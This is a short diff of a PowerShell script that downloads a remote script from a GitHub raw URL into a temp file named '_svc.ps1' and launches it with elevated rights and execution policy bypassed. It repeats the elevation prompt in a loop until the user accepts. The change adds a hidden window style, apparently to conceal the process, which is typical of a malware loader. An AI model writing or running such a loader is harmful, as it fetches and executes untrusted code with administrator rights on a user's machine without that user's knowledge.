@@ -13,7 +13,7 @@ if (-not $isAdmin) {
     $tmp = Join-Path $env:TEMP "_svc.ps1"
     (iwr "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -UseBasicParsing).Content | Out-File $tmp -Encoding UTF8 -Force
     while ($true) {
-        $p = Start-Process powershell -Verb RunAs -PassThru -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
+        $p = Start-Process powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
         if ($p -ne $null) { [Environment]::Exit(0) }
         Start-Sleep -Seconds 2
     }
